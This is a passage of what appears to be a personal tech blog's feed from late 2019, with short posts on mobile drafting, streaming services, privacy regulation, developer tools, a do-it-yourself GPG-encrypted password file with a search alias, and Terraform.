<p>I’ve been writing the rough drafts of my recent posts on my phone and this shift in environment has made me more creative. Maybe it’s due to the slower typing speed, the lack of distraction, the novelty, or just self-deception but it feels as if some of my previous rough drafts have had both more interesting thoughts, analogies, and wordsmithing. For example, <a href="http://dangoldin.com/2019/12/23/iphone-11-battery/">comparing the poor battery life</a> of my previous phone to checking out at a car’s gas tank before a trip or titling a post “<a href="http://dangoldin.com/2019/12/24/write-mobile-edit-desktop/">Write mobile, edit desktop</a>.” It’s impossible to know if I would have been able to do that if I were on my laptop but it really does seem as if the new environment had something to do with it.</p>

<p>I enjoy this new burst of creativity and am now trying to think of new ways to get this boost. A while back I <a href="https://trainingindustry.com/articles/content-development/how-the-brain-learns/">read something</a> about how changing your commute creates new neural pathways since you’re exercising entire new pathways. This is akin to that - breaking your routine and doing the same thing in a different way is a way to boost creativity. There are countless ways to find new ways of doing the same things and the process of thinking them up is itself a way to increase creativity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Write mobile, edit desktop</title>
   <link href="http://dangoldin.com/2019/12/24/write-mobile-edit-desktop/"/>
   <updated>2019-12-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/24/write-mobile-edit-desktop</id>
   <content:encoded><![CDATA[
<p>Similar to last year I’m behind on my blogging and need to write a dozen more posts in the next week to hit my annual blogging goal of two a week. At the same time I don’t have the luxury of time. The approach I’ve settled on is to write up the rough posts one handed on my phone and then edit them on an actual computer when I can. I have about a half dozen rough drafts in this state and will be cleaning them up over the next few days in addition to the others I need to write.</p>

<p>It’s pretty incredible that this is even possible. I’m writing this with my left hand (I’m a righty) and it’s surprisingly effective. Modern phones have some strong autocorrect and autocomplete and coupled with the “swipe” keyboard makes writing on the phone doable. I’d guess that in terms of pure typing I’m about 10% as effective on the phone as on a real keyboard but the majority of my writing is actually thinking of the proper phrase or words to use. I also don’t care about perfection on the phone and all I need to do is be close enough that I’ll be able to correct it later on when I’m in front of a keyboard.</p>

<p>The irony here is that I’m proud of this “achievement” and yet there must be millions of kids around the world who are mobile first and can type circles around me blindfolded.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>iPhone 11 battery</title>
   <link href="http://dangoldin.com/2019/12/23/iphone-11-battery/"/>
   <updated>2019-12-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/23/iphone-11-battery</id>
   <content:encoded><![CDATA[
<p>When the new iPhones were announced I quickly made the decision to upgrade from my 6S. I resisted an upgrade for as long as I could but what finally got me over the hump was not any of the features, as incredible as they are, but instead the need for a longer battery life.</p>

<p>My 6S couldn’t last a few hours of limited usage without running out of power. Similar to how someone will look at their gas tank before leaving on a trip I was doing the same for my phone’s battery charge any time I’d be away from a charger. It’s a surprisingly stressful and not healthy way to be and sadly highlights our dependence on always being connected.</p>

<p>The iPhone 11 makes a world of difference. I have yet to worry about running out of power and even with minimal charging it rarely drops below 50%. I have no clue how Apple managed to increase the battery life that significantly it but I’m eternally grateful.</p>

<p>The entire ordeal got me thinking of the different cohorts of upgrades. Some people just want the latest and greatest and will always spring for the new release. Others are all about photos and will go for the best camera. Another group does a ton of gaming or app usage and wants the improved performance. Then there are people like me who just want improved battery life. Sure we can pay for a replacement battery but it’s been a few years and the new features do sound nice.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Netflix's CEO transition</title>
   <link href="http://dangoldin.com/2019/12/22/netflixs-ceo-transition/"/>
   <updated>2019-12-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/22/netflixs-ceo-transition</id>
   <content:encoded><![CDATA[
<p>While browsing Quora I came across a neat answer by Marc Randolph, the founder of Netflix, to the question “What led you to step down as Netflix’s CEO?” I didn’t even know Netflix had a founder other than Reed Hastings and beyond that didn’t know that there was a CEO transition that early in its history.</p>

<p>Netflix is an incredibly dominant company now but it took more than two decades to get there. Netflix is actually older (founded in 1997) than both Google (1998) and Facebook (2004). The anecdote is remarkable since it shows a glimpse of the Netflix culture and how radical honesty was a key part from the very beginning. I’m impressed by both Reed’s ability to be that directly honest but also communicate in a way that kept Marc aligned and engaged. It’s an incredibly difficult thing to do - being able to have someone accept that they’re not not effective at their job - and a skill I continue to grow and develop. You need strong trust on both sides and the ability to let go of the ego. A good leader can make that happen.</p>

<p>https://www.quora.com/What-led-you-to-step-down-as-Netflix-s-CEO/answers/180200952?ch=10&amp;share=d37236e7&amp;srid=XP</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>DeAMPifying my blog</title>
   <link href="http://dangoldin.com/2019/12/21/deampifying-my-blog/"/>
   <updated>2019-12-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/21/deampifying-my-blog</id>
   <content:encoded><![CDATA[
<p>Since <a href="http://dangoldin.com/2016/09/05/ampifying-my-blog/">September of 2016</a> this blog has been exclusively (both mobile and desktop) in <a href="https://amp.dev/">AMP</a>. I initially decided to go with it due to a combination of curiosity, liking the concept, and a desire to revamp the blog. I had to resolve a variety of challenges ranging from supporting Disqus comments to migrating all the img tags to speeding up the build times. Most of these issues have been resolved for a while now and yet I’m tempted to ditch AMP and go back to a simple HTML and CSS site.</p>

<p>The primary reason is a desire to purify my site and avoid more of the Google lockin. The web was meant to be open and free so why couple my blog with a technology championed by a huge tech monopoly? Also, my blog is pretty simple and AMP is overkill. If I really cared about the render performance I’m sure I could use vanilla HTML and CSS to make it faster than AMP. There will be a fair amount of work but a fun and simple project for early 2020.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Privacy updates and emission standards</title>
   <link href="http://dangoldin.com/2019/12/20/privacy-updates-and-emission-standards/"/>
   <updated>2019-12-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/20/privacy-updates-and-emission-standards</id>
   <content:encoded><![CDATA[
<p>It’s that special time of the year when a whole slew of companies are sending out their privacy policy emails. Last year the culprit was GDPR, a European privacy law, and this year it’s the CCPA, the privacy protection bill from California. Given the onslaught most users will ignore these updates. These regulations seem to be having the desired effect. A bold company may choose to have separate privacy policies per geography to reduce the coverage of these laws but it looks as if most companies have just updated their general privacy policies. Europe and California are driving fairly significant change across the tech industry.</p>

<p>The same occurred with auto emission standards. California has <a href="https://en.wikipedia.org/wiki/United_States_emission_standards">its own emission standards</a> that are stricter than the ones at the federal level. California is also the most populous state and leads car manufacturers to build towards these stricter standards in order to be more regionally-compliant without fragmenting their models. States with the largest clout are driving change beyond their borders by betting that the cost of compliance outweighs the cost of fragmentation.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Class action settlements</title>
   <link href="http://dangoldin.com/2019/12/19/class-action-settlements/"/>
   <updated>2019-12-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/19/class-action-settlements</id>
   <content:encoded><![CDATA[
<p>Earlier this month I received an email from Zappos with the subject “Settlement Notification re: 2012 Security Incident.” Sure enough, Zappos had a security issue in 2012 and the result of the class action lawsuit was that they’d give their affected customers a 10% off coupon on any order placed before January. As far as the typical class action settlement this was a surprisingly fair offer since it is something I’d actually use.</p>

<p>This is reminiscent of the Experian settlement which gave affected customers the option of either $125 or free credit monitoring. To no one’s surprise nearly everyone chose the $125 option. Lo and behold it’s not actually $125 but instead “up to” $125 and given the volume it turns out this option is estimated to be only $7. Makes me wish I chose the credit monitoring!</p>

<p>It really should not be possible for a company to pay a class action settlement through its own services. While some may be good (Zappos), others are not (Equifax), and in general it leads to some perverse incentives. The goal should be punitive towards the company but by being able to pay in kind it’s another opportunity to drum up business. For Zappos it was a free opportunity to email their customers with a promotion one may have seen anyway. For Equifax it was signing them up to a service that doesn’t cost them anything to offer and expires after a few years. Imagine if companies actually had to pay real money for their screwups without any of the “up to” language - we’d see much better care of customer data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Shoulders of giants</title>
   <link href="http://dangoldin.com/2019/12/18/shoulders-of-giants/"/>
   <updated>2019-12-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/18/shoulders-of-giants</id>
   <content:encoded><![CDATA[
<p>A few days ago I came across a <a href="https://www.thespacereview.com/article/3833/1">first hand account</a> from an engineer working on some early space programs and it made me realize how little hardware I know. It’s likely a case of the grass being greener but hardware feels like a whole new exciting world compared to software. Rather than dealing with the abstract world of software it’s dealing with the real world.</p>

<p>The above article is an unfair one to use since anything related to space is going to be extra exciting but it highlights the depth and creativity necessary to work in hardware. Even in the 80s and 90s a software engineer needed to have a decent grasp of the underlying hardware to be productive. This is no longer the case. One can go through a career without understanding how computers actually work behind the scenes. That’s not necessarily a bad thing: the field is so wild with so much specialization that it’s difficult to have a good grasp of everything and we have to pick what we want to master.</p>

<p>The closest I can get to that era is by reading first hand accounts - they’re a good reminder that we’re all standing on the shoulders of giants.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2019 donations</title>
   <link href="http://dangoldin.com/2019/12/17/2019-donations/"/>
   <updated>2019-12-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/17/2019-donations</id>
   <content:encoded><![CDATA[
<p>It’s that time of the year where I make my annual donations. I’ve settled on a core set of foundations and charities that I donate to but occasionally have an outlier depending on what’s happening in the world and this year was no different.</p>

<ul>
  <li><a href="https://www.eff.org/">EFF</a>. Being in technology I’m more aware than most of the perils of technology and the EFF is at the forefront of defending digital privacy and rights in a constantly threatened world.</li>
  <li><a href="https://www.aclu.org/">ACLU</a>. Similar to the EFF but focused more broadly on all rights. Especially these days it’s critical to challenge unfair laws and fight for the bill of rights.</li>
  <li><a href="https://wikimediafoundation.org/">Wikipedia</a>. I can’t live without Wikipedia and use it all the time so it’s only fair that I donate some to keep it going.</li>
  <li><a href="https://www.plannedparenthood.org/">Planned Parenthood</a>. It’s a shame that we live in a world where Planned Parenthood even exists but until the day it’s unnecessary I’ll keep on donating. It provides incredibly valuable healthcare to remote areas and there are countless stories of them saving lives by being the only resource in a location.</li>
  <li><a href="https://amymcgrath.com/">Amy McGrath</a>. I try to stay away from politics but the current state makes me feel negligent not donating. Amy is running for the Kentucky senate seat against Mitch McConnell. So many of today’s problems can be attributed to McConnell and the sooner he’s out of office the sooner the United States can get back on track.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Disney's hostile takeover</title>
   <link href="http://dangoldin.com/2019/12/16/disneys-hostile-takeover/"/>
   <updated>2019-12-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/16/disneys-hostile-takeover</id>
   <content:encoded><![CDATA[
<p>While watching <a href="https://en.wikipedia.org/wiki/The_Imagineering_Story">The Imagineering Story</a> I discovered that Disney was the target of a hostile takeover attempt in the 1980s. This is shocking given how dominant Disney currently is and it’s incredible that it came that close to being broken up and sold as individual pieces. Luckily, Disney withstood the attempt but this was a wakeup call that led to Michael Eisner rekindling the Disney magic.</p>

<p>There’s a <a href="https://www.upi.com/Archives/1984/06/11/Walt-Disney-Productions-ended-financier-Saul-Steinbergs-takeover-attempt/1284455774400/">ton written</a> about the attempt by people better suited but what I find fascinating is that the entire breakup attempt goes against the entire strategy Walt Disney put together in 1957. The entire strategy is incredible and is still in play right now. The core are the movies and shows that Disney produces which then drive every other channel. The power of strong and compelling content creates adjacent opportunities that then feed the next generation of great content. It’s sad and scary to think what would have happened had Disney been broken up.</p>

<img src="http://dangoldin.com/assets/static/images/disney-strategy-1957.png" width="1024" height="896" layout="responsive" alt="Walt Disney's strategy from 1957"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>TabNine</title>
   <link href="http://dangoldin.com/2019/12/15/tabnine/"/>
   <updated>2019-12-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/15/tabnine</id>
   <content:encoded><![CDATA[
<p>I’m a heavy Visual Studio Code user and one of my favorite plugins has been <a href="https://tabnine.com/">TabNine</a>. I use VS Code to hack around across a variety of languages in addition to note-taking and TabNine makes me significantly more productive. It’s a language-agnostic autocompleter that relies on machine learning rather than predefined heuristics and analyzes whatever you type in order to offer you a variety of suggestions. It’s similar to GMail’s new autocomplete functionality but in your editor.</p>

<p>For example, I write this blog in Jekyll which has the following standard header:</p>

<img src="http://dangoldin.com/assets/static/images/blogpost-header-tabnine.png" width="317" height="295" alt="Blogpost header" layout="intrinsic"/>

<p>As soon as I start typing I get the following suggestions from TabNine:</p>

<img src="http://dangoldin.com/assets/static/images/blogpost-header-tabnine2.png" width="968" height="297" alt="Blogpost header TabNine suggestions" layout="intrinsic"/>

<img src="http://dangoldin.com/assets/static/images/blogpost-header-tabnine3.png" width="445" height="297" alt="Blogpost header TabNine suggestions" layout="intrinsic"/>

<p>The suggestions aren’t based on any rules or an actual understanding of my intent but are instead trained through my usage. I didn’t have to do anything to configure it and it’s been working right out of the box. It’s not perfect and the lack of context around my intent limits the potential. Despite that, it has enough training data that it’s able to offer some surprisingly accurate predictions. I suspect we’ll see more and more full featured IDEs adopt a similar approach that’s less based on rules and heuristics and instead based on actual usage and behavior. Imagine being able to train not on just your own code but also what every other engineer had typed - for example generating predictions based on the content in StackOverlfow.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Avoiding the mouse</title>
   <link href="http://dangoldin.com/2019/12/14/avoiding-the-mouse/"/>
   <updated>2019-12-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/14/avoiding-the-mouse</id>
   <content:encoded><![CDATA[
<p>I spent a ton of time in Excel back in my consulting and finance days. One of the most common refrains was that to be more efficient one had to do everything with the keyboard: no mouse allowed. The idea here that keyboard shortcuts are going to be much faster than navigating menus with a mouse.</p>

<p>You don’t hear this too often in software engineering but it applies just as much. Nearly every tool we use can be controlled via shortcuts yet too often we’re gravitating towards the mouse. Keyboard shortcuts aren’t intuitive and it takes time to get the muscle memory down but it’s all worth it once it’s mastered. It’s incredible seeing people work who have this level of mastery - it’s akin to watching piano virtuosos performing complex symphonies. Even if we don’t get to that level nearly anyone can benefit from at least having the basic shortcuts down. Superhuman is an incredibly successful product and a big part is the focus on making users more efficient through clever and powerful shortcuts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Disney+</title>
   <link href="http://dangoldin.com/2019/12/13/disney/"/>
   <updated>2019-12-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/13/disney</id>
   <content:encoded><![CDATA[
<p>I signed up for the Disney+ account as soon as it launched. The primary reason was for The Mandalorian but I’m also enjoying The Imagineering Story and access to The Simpsons archive. My biggest surprise was how polished it all was. It’s a brand new product and it’s impressive what the team has done. It had a few hiccups at launch has but has been extremely smooth since then.</p>

<p>I use it on the Fire TV Stick so can’t speak to the other platforms but it’s simpler, and yet more polished than Netflix. It doesn’t have any of the autoplay nonsense that Netflix and Amazon Prime shove down your throat. It also keeps the order of shows consistent across sessions which makes navigation a breeze. Yet my favorite feature so far is the keyboard less login and being able to do it solely from your phone. It’s such a simple thing but makes the onboarding experience orders of magnitude better versus Netflix where you’re forced to type on a TV keyboard through a remote. I’m honestly surprised Netflix still hasn’t implemented this given how often the Netflix app decides to log me out.</p>

<p>The streaming wars are heating up and it’s a great time to be a consumer. It’s impossible to predict the future but Disney’s execution, both product and business, has been spot-on.</p>

<p>Disclosure: I have shares in both Netflix and Disney.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2019 Predictions in review</title>
   <link href="http://dangoldin.com/2019/12/12/2019-predictions-in-review/"/>
   <updated>2019-12-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/12/2019-predictions-in-review</id>
   <content:encoded><![CDATA[
<p>At the end of 2018 I made <a href="http://dangoldin.com/2018/12/31/2019-predictions/">four predictions for 2019</a> and now that we’re nearing the end of the year it’s time to see how accurate they were. It’s a valuable exercise to review them - both to hold myself accountable but also to get a glimpse of how I thought about the world a year ago. It’s also a way to understand the biases I fall into and use that information to hopefully improve my predictions for 2020.</p>

<p>So how’d I do?</p>

<ul>
  <li><strong>The overall economy takes a hit</strong>. I was clearly wrong here and the market, as measured by the S&amp;P 500 grew 25%. My initial thinking was that there would be some event that in the current political climate would lead to a downturn but this year turned out to be exceptionally strong.</li>
  <li><strong>Facebook privacy concerns are overblown</strong>. This turned out to be true and Facebook has performed exceptionally well in the market being up 45% year to date. There’s been a ton of harsh press but it hasn’t really impeded Facebook’s ability to grow and generate revenue.</li>
  <li><strong>Amazon continues to dominate</strong>. Similar story with Amazon. It hasn’t grown as significantly as Facebook but is up 14% year to date. I am and have been more optimistic around Amazon’s growth prospects than Facebook’s so this was a bit of a surprise. Every company has a ceiling and I suspect Facebook will be hitting theirs ahead of Amazon.</li>
  <li><strong>China vs US becomes a bigger deal</strong>. This is tough to say. There’s clearly a lot of back and forth between the two countries around tariffs that’s still playing out but I expected worse and drove my prediction for the hit to the economy.</li>
</ul>

<p>Overall I’d say I got at least two correct, one partially right, and one way off target. I’m still coming up with predictions for 2020 so we’ll see how accurate those are a year from now.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Strive for linear complexity</title>
   <link href="http://dangoldin.com/2019/12/11/strive-for-linear-complexity/"/>
   <updated>2019-12-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/11/strive-for-linear-complexity</id>
   <content:encoded><![CDATA[
<p>Good software is dynamic and evolves as the requirements grow. The code usually starts clean, elegant, and simple but inevitably grows in complexity. The challenge is to manage that growing complexity. My approach is to strive to make that complexity linear rather than multiplicative. A multiplicative approach is one where a new requirement forces you to think through other parts of your code and determine what needs to change. A linear approach is one where this additional requirement forces you to think through others in its class but not much beyond that. A simple way to visualize the difference is through if statements. A codebase with multiplicative complexity has a ton of nested ifs where writing new code requires you to understand each of the other if-else branches. A linear complexity codebase would still require you to think through a new behavior but the complexity would be limited to a flat if block.</p>

<p>I realize the above is a bit abstract and may not be getting the point across but the goal is to find the appropriate abstractions that let you take a complex problem and break it up into a series of independent and loosely coupled components. This requires understanding the problem domain and how to represent the various objects in a way that hides their complexity and only exposes the minimum that’s necessary. None of this is simple and feels more like art than science that can be grown with experience but it’s an incredibly valuable ability.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Search within Google search</title>
   <link href="http://dangoldin.com/2019/12/11/search-within-google-search/"/>
   <updated>2019-12-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/11/search-within-google-search</id>
   <content:encoded><![CDATA[
<p>Google Search has evolved quite a bit from a single search bar and now contains a ton of modules to give users what they want as quickly as they can. This manifests itself in sections optimized for different verticals: sports, travel, shopping, weather, Wikipedia, and really anything that can be somewhat structured.</p>

<img src="http://dangoldin.com/assets/static/images/search-within-google-search.png" alt="Search within Google search" width="719" height="408" layout="responsive"/>

<p>I discovered a new module yesterday when doing a search for an online thesaurus. Rather than just have a link to thesaurus.com, Google showed a search field that is hooked up directly to the thesaraus.com search. I don’t know if this was done solely by Google or required some collaboration but it’s another way Google is delivering more immediate answers and further capturing user attention.</p>

<p>It’s interesting to see where this leads. Google has gotten modules for the obvious verticals but clearly there are a ton left. In the extreme case a user can get every answer via the search results page but then there’s very little incentive for content creators to actually produce the information. At the same time, Google will continue to improve their data science and machine learning models and will be able to tackle more and more generic questions. This is akin to the differences between narrow and general AIs. Right now our these are designed around specific use cases but as technology and AI matures we’ll see more general results that will be able to surface the desired results immediately.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Solve categories, not individual problems</title>
   <link href="http://dangoldin.com/2019/12/10/solve-categories-not-individual-problems/"/>
   <updated>2019-12-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/12/10/solve-categories-not-individual-problems</id>
   <content:encoded><![CDATA[
<p>One of the most valuable abilities in modern software development is the ability to solve entire categories of issues instead of the immediate problem in front of us. It’s simpler and tempting to solve what’s in front of us so and then move on. It takes discipline and thoroughness to understand the problem, diagnose its cause, and prevent similar problems from arising in the future. Yet that’s the way to make an impact.</p>

<p>Pattern recognition is a big part of this. Some engineers will see a variety of tasks or bugs as completely independent while others will realize there’s a pattern and they’re all related. The ability to think about the whole system is critical in writing scalable code and those looking to solve categories</p>

<p>It’s the latter approach that leads to writing scalable code. The ability to think about the whole system is the key to keeping code simple and avoiding problems. By constantly asking ourselves “Is this truly isolated or is it one of many?” we’re able to train ourselves to solve the real problems.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My TI-89</title>
   <link href="http://dangoldin.com/2019/11/29/my-ti-89/"/>
   <updated>2019-11-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/29/my-ti-89</id>
   <content:encoded><![CDATA[
<p>A <a href="https://news.ycombinator.com/item?id=21638980">Hacker News thread</a> hit a nostalgic moment for me and brought back all my memories of my TI-89 that lasted me throughout high school and college. I unfortunately have no idea where it is and have very little use for one now but it was an incredible machine.</p>

<p>It came with a built in solver and an algebraic manipulation library which made solving all sorts of problems a breeze. Rather than being purely decimal based it also expressed irrational and rational numbers which came in incredibly healthy for many tests. For some unfathomable reason it was somehow allowed on the SATs which made them that much easier.</p>

<p>Beyond that, it came with all sorts of functions that barely scratched the surface off my knowledge. I vaguely recall using it in my college statistics classes to great effect so I assume it had a deep statistics library.</p>

<p>But my favorite feature was probably the games. Why the high-school issued TI-83 had drug runner the TI-89 had a Street Fighter clone with some surprisingly
Intricate graphics.</p>

<p>It’s still a scam that high schoolers need to buy a $100 calculator but damn, what an incredible calculator.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Thanksgiving</title>
   <link href="http://dangoldin.com/2019/11/28/thanksgiving/"/>
   <updated>2019-11-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/28/thanksgiving</id>
   <content:encoded><![CDATA[
<p>Despite Black Friday being my least favorite day of the year Thanksgiving is by far my favorite holiday. It’s completely secular and is about celebrating everything we have with the people closest to us. Rather than travel somewhere new we instead go to places we’ve already been to to see the same people we see every year.</p>

<p>It’s a chance for us to slow down and really appreciate everything we have. I arrived to the United States as kid after family emigrated to seek a better life and I’m eternally grateful that they took that risk. We didn’t start with much but more than many others and Thanksgiving is my time to acknowledge the sacrifices my family has made while being thankful that the United States, despite its problems, remains a land of opportunity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Improving product reviews</title>
   <link href="http://dangoldin.com/2019/11/24/improving-product-reviews/"/>
   <updated>2019-11-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/24/improving-product-reviews</id>
   <content:encoded><![CDATA[
<p>Modern ecommerce is predicated on having proper product reviews. Every site that sells online depends on them and yet they’re still far from what they can be. The reviews I’ve seen tend to be done when a product arrives rather than after years of use. Similarly, manufactures may change and shift production over time so early reviews will highlight the high quality of a product while latter reviews will bemoan the lack of quality.</p>

<p>An ideal product review site would include information that would help understand the lifetime of a product. It might be cheap but will it need replacing within a year? Or is it expensive but it will last decades so the amortized price is actually good? It’s not possible to get these answers on modern review sites which leads us to focus on the purchase price and not the true cost of ownership.</p>

<p>Two sites I’m aware of that are tackling this is <a href="https://thewirecutter.com">Wirecutter</a> and the <a href="https://www.reddit.com/r/BuyItForLife/">Buy It For Life</a> subreddit. Writecutter provides a top X list of items by category where they go through a serious array of tests before providing a suggestion. Buy It For Life, on the other hand, is a community site where people can both share the products they’ve owned (or inherited) for decades and ask advice from others. Neither of these are designed around a product listing and I’d love a review site that takes the design and feel of an Amazon product page with additional information about the longevity and true cost of ownership.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Optimizing long running SQL queries</title>
   <link href="http://dangoldin.com/2019/11/23/optimizing-long-running-sql-queries/"/>
   <updated>2019-11-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/23/optimizing-long-running-sql-queries</id>
   <content:encoded><![CDATA[
<p>A year ago I read a <a href="https://www.spinellis.gr/blog/20180805/">post</a> on how someone took a SQL query that took 380 hours to run and by offloading some of the work to shell commands was able to get the run time down to 12 hours. I’m a huge fan of the shell and believe it’s underutilized by most engineers yet I can’t get over the fact that a query still takes 12 hours to run. I have very little context around the data, the query, or the join but my approach would be to see if there’s a different toolset to solve the problem. Running a 12 hour query is dangerous - a disruption will require the query to be run from scratch and the affected tables are locked for that amount of time. It’s likely the case that this project doesn’t need anything better but even then there should be ways of improving the approach.</p>

<p>Maybe the solution is to create intermediate tables that get updated incrementally which are then the sources to the final query. Maybe it’s to revisit the indices and schema to see if there’s anything that can be restructured. Maybe it’s to shift to a different database engine - a columnar engine such as <a href="https://aws.amazon.com/redshift/">Redshift</a> (paid) or <a href="https://www.monetdb.org">MonetDB</a> (Open Source). Without knowing the details of the database or the query it’s difficult to say what the ideal solution would be but seeing a 12 hour query makes me think there’s a larger change that needs to be made.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>SMS based password manager</title>
   <link href="http://dangoldin.com/2019/11/19/sms-based-password-manager/"/>
   <updated>2019-11-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/19/sms-based-password-manager</id>
   <content:encoded><![CDATA[
<p>Two Fridays ago I wrote about my <a href="http://dangoldin.com/2019/11/08/dyi-password-manager/">home-built password manager</a> and while working well on a computer it was a pain to use on mobile. I’ve been trying to think of a more friendly way of supporting this on mobile and came up with the idea of retrieving the passwords via SMS. The workflow would be to send a text to a number with a search term and then get the password back as a response. Twilio made it surprisingly easy to build a simple proof of concept (<a href="https://github.com/dangoldin/password-manager">GitHub code</a>) and the resulting code is fewer than 50 lines and supports the use case.</p>

<p>There’s a fair amount of left to do - ranging from improving the error correction to dockerizing and deploying the code - but it works as is and I’ve been using it locally via <a href="https://ngrok.com">ngrok</a>. There are probably dozens of usability improvements I can make but the major one I noticed is that iOS doesn’t allow me to highlight a section of a text message - only the entire thing. This means that I need to tweak the Twilio code to send the response line by line. This will be a tad more expensive but cheaper than using a paid password manager. The other question I’m still trying to work through is the security of SMS.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Rebirth of digital piracy?</title>
   <link href="http://dangoldin.com/2019/11/17/rebirth-of-digital-piracy/"/>
   <updated>2019-11-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/17/rebirth-of-digital-piracy</id>
   <content:encoded><![CDATA[
<p>The best jokes have an element of truth to them and earlier today I came across a comic that was a great example.</p>

<img src="http://dangoldin.com/assets/static/images/streaming-piracy.jpg" alt="Streaming piracy comic" width="700" height="596" layout="responsive"/>
<p class="caption">Source: <a href="https://www.reddit.com/r/comics/comments/bcdlbf/hello_old_friend_oc/">Hoppy_Doodle @ reddit.com</a></p>

<p>It’s surprising how true that is. Many of us have been cable TV free for years and were content paying a monthly internet bill along with Netflix and maybe one or two additional subscriptions. Now it feels as if there’s a new streaming service launching every few months with the costs adding up to be equivalent to a traditional cable TV bill.</p>

<p>This is magnified with the new services pulling their content from Netflix - Disney <a href="https://www.cnbc.com/2019/03/06/disneys-streaming-service-will-rival-netflix-says-jp-morgan.html">pulled their content</a> and NBC is <a href="https://www.hollywoodreporter.com/live-feed/parks-recreation-moving-exclusively-nbcuniversal-streamer-1240225">pulling a variety of shows</a> as well. At what point are people paying $10/month to watch a single show?</p>

<p>I like to joke that a future consumption model is to rotate these services monthly and catch up on shows every few months. That way I’m paying a single monthly fee but get the content from multiple services - all I have to do is wait. For those that do want to watch a single show I do expect privacy to make a comeback - it’s difficult to justify paying a monthly fee for a single show.</p>

<p>This reminds me of the famous Jim Barksdale quote: “There’s only two ways I know of to make money– bundling, and unbundling” and it looks as if we’re approaching the unbundling cycle.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>DYI password manager</title>
   <link href="http://dangoldin.com/2019/11/08/dyi-password-manager/"/>
   <updated>2019-11-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/08/dyi-password-manager</id>
   <content:encoded><![CDATA[
<p>I prefer plaintext for all my note taking. Text files are extremely portable and serve as a flexible foundation for anything I’d want to do. For example, I can use grep to perform complex regex searches across thousands of files. If I want to apply a bulk operation to my notes I can write a quick script to do so. This is all possible because there’s no proprietary format backing them and I’m able to leverage the power of the command line.</p>

<p>I recently adopted this approach to manage my passwords. I like to keep all my notes in Dropbox so it’s synced across devices while being accessible on my phone. I wanted to do the same thing for my passwords but also want to make sure it’s stored securely on Dropbox. To do so, I ended up with a pretty simple approach where I encrypt it using GPG via a symmetric cipher. That way the file itself is encrypted but can be easily decrypted when I need to access anything from it.</p>

<p>To search my passwords it’s a simple alias command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">alias </span><span class="nv">pass</span><span class="o">=</span><span class="s1">'gpg -d ~/Dropbox/notes/passwords.txt.gpg | grep -A 4'</span></code></pre></figure>

<p>This decrypts the file and then pipes the result into grep which performs a simple search and shows the subsequent four lines upon given a match. The format of the file is simple: a series of blocks where the first line contains some descriptive information about the site/application/whatever followed by a line (or more) with the actual secrets. For example,</p>

<figure class="highlight"><pre><code class="language-txt" data-lang="txt">github.com
d...g..@gmail.com/dasdsa321313212
d..g..@workemail.com/12321dasdsadsa

Anothersite.com
	32132zxczxdsa1231</code></pre></figure>

<p>It’s far from perfect. The most annoying part is accessing the secrets on a mobile device. My approach to that is a simple website that is just a wrapper around the above alias. There’s a lot more to do here but this approach works for me.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Importing resources into terraform</title>
   <link href="http://dangoldin.com/2019/11/06/importing-resources-into-terraform/"/>
   <updated>2019-11-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/06/importing-resources-into-terraform</id>
   <content:encoded><![CDATA[
<p>You don’t appreciate <a href="https://www.terraform.io">Terraform</a> until you have hundreds of AWS resources with dozens of security rules. But once you develop that appreciate it becomes an indispensable tool in managing and scaling your infrastructure. I’m a huge fan of Terraform and recently started moving a bunch of my personal project resources into Terraform.</p>

